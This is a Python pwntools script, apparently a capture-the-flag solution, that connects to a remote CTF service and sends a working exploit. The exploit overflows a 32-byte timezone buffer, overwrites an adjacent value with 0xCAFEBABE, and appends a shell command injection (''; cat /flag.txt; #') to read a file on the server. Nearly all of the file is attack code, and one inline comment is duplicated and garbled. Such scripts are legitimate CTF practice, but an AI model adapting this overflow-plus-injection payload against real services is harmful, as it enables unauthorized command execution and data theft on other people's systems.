#!/usr/bin/env python3
from pwn import *

def main():
    # Conexión remota
    host = 'pwn.ctf.uscybergames.com'
    port = 5000
    p = remote(host, port)

    # Construcción del payload
    pad   = b"A" * 36  # 36 bytes para timezone[32]
    magic = p32(0xCAFEBABE)         # overwrite de donuts
    inj   = b"'; cat /flag.txt; #"    # inyección de comando con ruta absoluta"    # inyección de comando

    # Envío del payload
    p.recvuntil(b'Please enter your timezone')
    p.sendline(pad + magic + inj)

    # Selección de Maintenance
    p.recvuntil(b'Options:')
    p.sendline(b'3')

    # Lectura de la flag
    flag = p.recvuntil(b'}', timeout=2).decode(errors='ignore')
    print(flag)

    p.close()

if __name__ == '__main__':
    main()